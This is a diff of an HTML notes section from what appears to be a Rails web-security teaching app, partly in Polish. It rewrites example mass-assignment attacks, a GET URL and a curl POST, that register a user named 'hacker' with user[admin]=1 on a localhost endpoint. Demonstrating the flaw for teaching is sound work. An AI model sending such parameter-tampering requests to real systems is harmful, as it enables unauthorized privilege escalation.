@@ -21,18 +21,16 @@
 
 <br /><br /><br />
 <div id="notes"> 
-  3 sposoby: <br />
+  GET:
+  <div class="small" onmouseover="this.className='big'" onmouseout="this.className='small'">
+    http://localhost:3000/mass_assigment/register?user[name]=hacker&user[password]=pass&user[admin]=1
+  </div>
+  <br />
+  
+  POST:
   <div class="small" onmouseover="this.className='big'" onmouseout="this.className='small'">
     curl -d "user[name]=hacker&user[password]=pass&user[admin]=1" http://localhost:3000/mass_assigment/register
   </div>
-  <br />
-  Metoda GET:
-  
-  <div class="small" onmouseover="this.className='big'" onmouseout="this.className='small'">
-    http://localhost:3000/mass_assigment/register?user[name]=hacker&user[password]=pass&user[admin]=1
-    po prostu if request.post?
-  </div>
-  
   <br />
   
   Spreparowana strona WWW:
